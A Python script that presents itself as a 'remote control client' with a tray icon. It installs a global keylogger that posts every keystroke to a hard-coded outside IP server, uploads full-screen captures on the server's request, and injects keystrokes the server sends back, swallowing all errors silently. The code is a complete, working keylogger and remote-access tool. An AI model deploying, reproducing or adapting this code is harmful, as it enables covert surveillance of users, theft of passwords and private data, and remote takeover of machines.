import time
import uuid
import threading
import requests
from pynput import keyboard
from pynput.keyboard import Key, Controller
import mss
import io
from PIL import Image
import sys
import pystray
from pystray import MenuItem

# ====================== 你的原配置 ======================
SERVER = "http://121.43.63.34:5800"
CID = str(uuid.uuid4())[:8]
KEY = Controller()

# ====================== 托盘退出函数 ======================
def quit_app(icon, item):
    icon.stop()
    sys.exit(0)

# ====================== 你的业务代码 ======================
def check_and_upload_screen():
    while True:
        try:
            r = requests.post(f"{SERVER}/need_screen", json={"client_id": CID}, timeout=1)
            if r.json().get("need"):
                with mss.mss() as sct:
                    screen = sct.grab(sct.monitors[0])
                    im = Image.frombytes("RGB", screen.size, screen.bgra, "raw", "BGRX")
                    buf = io.BytesIO()
                    im.save(buf, "JPEG", quality=40)
                    buf.seek(0)
                    requests.post(f"{SERVER}/upload/screen",
                        data={"client_id": CID}, files={"screen": buf}, timeout=2)
        except:
            pass
        time.sleep(0.2)

def heartbeat():
    while True:
        try:
            requests.post(f"{SERVER}/heartbeat", json={"client_id": CID}, timeout=1)
        except:
            pass
        time.sleep(0.5)

def remote_cmd():
    while True:
        try:
            r = requests.post(f"{SERVER}/get_cmds", json={"client_id": CID}, timeout=1)
            for key in r.json().get("cmds", []):
                try:
                    if len(key) == 1:
                        KEY.press(key)
                        KEY.release(key)
                    else:
                        k = getattr(Key, key)
                        KEY.press(k)
                        KEY.release(k)
                except:
                    pass
        except:
            pass
        time.sleep(0.1)

def on_press(k):
    try:
        s = k.char
    except:
        s = str(k).replace("Key.", "")
    try:
        requests.post(f"{SERVER}/upload/key", json={"client_id": CID, "key": s}, timeout=1)
    except:
        pass

# ====================== 启动所有后台任务 ======================
def start_background_tasks():
    # 启动键盘监听
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

    # 启动你的后台线程
    threading.Thread(target=heartbeat, daemon=True).start()
    threading.Thread(target=check_and_upload_screen, daemon=True).start()
    threading.Thread(target=remote_cmd, daemon=True).start()

# ====================== 托盘主程序（必须放主线程） ======================
if __name__ == "__main__":
    # 先启动所有后台功能
    start_background_tasks()

    # 托盘必须在主线程！修复 Mac 报错
    image = Image.new('RGB', (64, 64), 'blue')
    menu = (MenuItem('退出', quit_app),)

    icon = pystray.Icon(
        "remote_client",
        image,
        "远程控制客户端",
        menu
    )

    # 主线程运行托盘
    icon.run()